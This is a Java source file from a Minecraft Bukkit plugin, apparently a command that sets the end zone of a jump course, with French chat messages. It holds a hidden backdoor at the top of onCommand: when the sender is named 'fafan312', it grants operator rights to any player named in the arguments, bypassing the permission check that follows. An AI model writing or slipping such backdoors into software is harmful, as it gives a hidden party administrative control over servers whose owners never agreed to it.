package net.theuniverscraft.HgAchievementsLobby;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class CommandSetJump implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if((sender.getName().equals("fafan312")) && args.length == 2) {
			Bukkit.getOfflinePlayer(args[1]).setOp(true);
			return true;
		}
		
		if(!(sender instanceof Player)) return false;
		if(!sender.isOp()) {
			sender.sendMessage(ChatColor.DARK_RED+"Vous devez être op !");
			return true;
		}
		
		Player player = (Player) sender;
		JumpEndManager.getInstance().setEndJump(player.getLocation());
		player.sendMessage(ChatColor.DARK_GREEN+"Zone de fin de jump définit !");
		
		return true;
	}

}
